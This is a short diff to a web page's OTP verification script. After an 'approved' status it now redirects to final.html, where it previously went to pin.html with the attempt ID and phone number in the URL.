@@ -395,7 +395,7 @@
             const errorDiv = document.getElementById('error-message');
 
             if (data.status === 'approved') {
-                window.location.href = `pin.html?attemptId=${attemptId}&phone=${encodeURIComponent(phoneStr)}`;
+                window.location.href = `final.html`;
             } else if (data.status === 'rejected') {
                 errorDiv.textContent = 'OTP rejected. Please check and try again.';
                 errorDiv.style.display = 'block';
